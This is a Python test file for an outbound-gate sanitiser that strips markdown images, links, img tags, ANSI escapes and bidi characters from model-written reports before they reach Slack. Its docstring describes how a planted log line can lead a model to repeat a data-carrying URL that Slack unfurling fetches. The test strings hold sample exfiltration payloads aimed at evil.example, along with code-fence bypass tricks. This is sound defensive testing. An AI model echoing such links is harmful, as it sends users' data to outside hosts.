"""Ported from WARDEN tests/test_gate.py (main a1e76cbf, veerarakesh56/warden). Kept 4 tests; dropped 13 that need WARDEN-only modules or unported gate policy (listed in the PR).

The outbound gate v0 (Phase 0): G3 untrusted-text hygiene, G5 leak block, and the Slack wiring.

The attack these pin: a log line (anyone who can make the application log can write one) carries a
markdown image or link whose URL holds data; the model repeats it in its hypothesis; the report goes
to Slack; Slack's servers fetch the URL (unfurling) or a person clicks it - data out, no click needed."""

from __future__ import annotations

import pytest

from hadavin_sdk.approvals.gate import sanitise_text

EXFIL = "![x](https://evil.example/c?d=SECRETDATA) see [runbook](https://evil.example/r) https://evil.example/p <img src=x>"


@pytest.mark.parametrize(
    "attack, gone",
    [
        ("see [docs](//evil.example/c?d=x)", "evil.example"),
        ("see [docs]( relative/path?d=x )", "relative/path"),
        ("[ref]: //evil.example/c?d=x", "evil.example"),
        ("<img/src=//evil.example/c?d=x>", "<img"),
        ("fetch //evil.example/c?d=x now", "//evil.example"),
        ("data rides in abc123secret.evil.com please", "evil.com"),
        ("colour \x1b[31mred\x1b[0m and \u202eevil", "\x1b"),
        ("colour \x1b[31mred\x1b[0m and \u202eevil", "\u202e"),
    ],
)
def test_g3_catches_what_it_used_to_miss(attack, gone):
    assert gone not in sanitise_text(attack)


@pytest.mark.parametrize(
    "text",
    [
        "    ```\n![x](https://evil.example/c?d=1)",
        "    ```\n![x](https://evil.example/c?d=1)\n```",
        "~~~\n```\n~~~\n![x](https://evil.example/c?d=1)",
        "```\n![x](https://evil.example/c?d=1)",
    ],
)
def test_a_fence_trick_cannot_turn_sanitising_off(text):
    """Audit A-C-9: fence tracking was `lstrip().startswith("```")`."""
    assert "evil.example" not in sanitise_text(text)


def test_real_code_blocks_stay_verbatim():
    kept = "```\n![x](https://evil.example/c)\n```"
    assert sanitise_text(kept) == kept
    assert sanitise_text("~~~\n<img src=x>\n~~~") == "~~~\n\n~~~"


def test_a_decimal_reference_is_ascii_digits_only():
    """CommonMark decodes `&#123;` (ASCII digits), never `&#` + Arabic-Indic digits: only the first is escaped, as
    before `[0-9]` became `\\d` (an unflagged `\\d` also matches every Unicode digit)."""
    assert sanitise_text("a &#123; b") == "a &amp;#123; b"
    assert sanitise_text("a &#١٢٣; b") == "a &#١٢٣; b"
